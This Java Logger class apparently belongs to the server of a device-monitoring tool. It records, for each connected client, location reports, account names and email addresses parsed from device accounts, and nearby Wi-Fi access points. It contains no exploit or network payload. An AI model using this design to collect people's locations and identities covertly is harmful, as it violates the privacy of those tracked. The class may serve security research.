import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;

public class Logger {

    public static final int LOG_TYPE_PROGRESS = 0;
    public static final int LOG_TYPE_NORMAL = 1;
    public static final int LOG_TYPE_LOCATIONS = 2;
    public static final int LOG_TYPE_ACCOUNTS = 3;
    public static final int LOG_WIFI_APS = 4;
    public static final int LOG_TYPE_THREADS = 5;

    private static SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MMM-dd HH:mm:ss", Locale.getDefault());
    private ArrayList<String> accountNames = new ArrayList<String>();

    File threadsLogFile, globalLogFile, clientThreadLogFile, locationsFile, userFile, wifiAPFile;
    int logType;
    String clientId;

    public Logger(int logType, String clientId) {
        this.logType = logType;
        this.clientId = clientId;
        threadsLogFile = new File("threads" + ".log");
        globalLogFile = new File("logfile" + ".log");
        clientThreadLogFile = new File(clientId, "client-logfile.log");
        locationsFile = new File(clientId, "locations.log");
        userFile = new File(clientId, "names-and-emails.log");
        wifiAPFile = new File(clientId, "wifi-aps.log");
    }

    public void log(String str) {
        try {
            switch (logType) {
                case LOG_TYPE_THREADS:
                    StringBuilder sbThreads = new StringBuilder();
                    sbThreads.append(formatter.format(Calendar.getInstance().getTime()));
                    sbThreads.append(" Threads: \r\n");
                    if(ConnectionHandler.clientThreads.size() > 0) {
                        for (int i = 0; i < ConnectionHandler.clientThreads.size(); i++) {
                            sbThreads.append(i);
                            sbThreads.append(" ");
                            sbThreads.append(ConnectionHandler.clientThreads.get(i).getClientID());
                            sbThreads.append(" ");
                            sbThreads.append(ConnectionHandler.clientThreads.get(i).getGuessedNames().get(0));
                            sbThreads.append(" ");
                            sbThreads.append(ConnectionHandler.clientThreads.get(i).getEmailAddresses().get(0));
                            sbThreads.append("\r\n");
                        }
                    } else {
                        sbThreads.append("No connected devices");
                    }
                    FileUtils.writeStringToFile(threadsLogFile, sbThreads.toString(), "UTF-8", false);
                    break;
                case LOG_TYPE_PROGRESS:
                    System.out.print(str);
                    FileUtils.writeStringToFile(globalLogFile, str, "UTF-8", true);
                    break;
                case LOG_TYPE_NORMAL:
                    // Create global log message
                    StringBuilder sbGlobal = new StringBuilder();
                    sbGlobal.append(formatter.format(Calendar.getInstance().getTime()));
                    sbGlobal.append(" ");
                    sbGlobal.append(clientId);
                    sbGlobal.append(" ");
                    sbGlobal.append(str);
                    FileUtils.writeStringToFile(globalLogFile, sbGlobal.toString() + "\r\n", "UTF-8", true);

                    // Create clientThread log message
                    StringBuilder sbClient = new StringBuilder();
                    sbClient.append(formatter.format(Calendar.getInstance().getTime()));
                    sbClient.append(" ");
                    int index = -1;
                    for (int i = 0; i < ConnectionHandler.clientThreads.size(); i++) {
                        if (ConnectionHandler.clientThreads.get(i).getClientID().matches(clientId)) {
                            index = i;
                        }
                    }
                    sbClient.append(index);
                    sbClient.append(" ");
                    sbClient.append(str);
                    FileUtils.writeStringToFile(clientThreadLogFile, sbClient.toString() + "\r\n", "UTF-8", true);

                    // Log global to console
                    System.out.println(sbGlobal.toString());
                    break;
                case LOG_TYPE_LOCATIONS:
                    StringBuilder sbLoc = new StringBuilder();
                    sbLoc.append(formatter.format(Calendar.getInstance().getTime()));
                    sbLoc.append(" ");
                    sbLoc.append(clientId);
                    sbLoc.append(" ");
                    sbLoc.append(str);
                    sbLoc.append("\r\n");
                    FileUtils.writeStringToFile(locationsFile, sbLoc.toString(), "UTF-8", true);
                    break;
                case LOG_TYPE_ACCOUNTS:
                    String email, guessName = "";
                    String accountName = str.substring(
                            str.indexOf("name=") + "name=".length(),
                            str.indexOf(",")
                    );
                    if (accountName.contains("@") && accountName.contains(".")) {
                        // entry is probably an email address
                        accountName = "Email: " + accountName;
                    } else if (!accountName.matches("WhatsApp") && !accountName.matches("LinkedIn")) {
                        // entry is probably a name TODO more company names like the above
                        accountName = "Name : " + accountName;
                    } else {
                        return;
                    }
                    if (!accountNames.contains(accountName)) {
                        accountNames.add(accountName);
                    }
                    StringBuilder sbUsers = new StringBuilder();
                    sbUsers.append(formatter.format(Calendar.getInstance().getTime()));
                    sbUsers.append(" ");
                    sbUsers.append(clientId);
                    sbUsers.append("\r\n");
                    // Try to get some human readable contact info
                    for (String n : accountNames) {
                        sbUsers.append(n);
                        sbUsers.append("\r\n");
                    }
                    FileUtils.writeStringToFile(userFile, sbUsers.toString(), "UTF-8", false);
                    break;
                case LOG_WIFI_APS:
                    StringBuilder sbAPs = new StringBuilder();
                    sbAPs.append(formatter.format(Calendar.getInstance().getTime()));
                    sbAPs.append(" ");
                    sbAPs.append(clientId);
                    sbAPs.append(" ");
                    sbAPs.append(str);
                    sbAPs.append("\r\n");
                    FileUtils.writeStringToFile(wifiAPFile, sbAPs.toString(), "UTF-8", true);
                    break;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}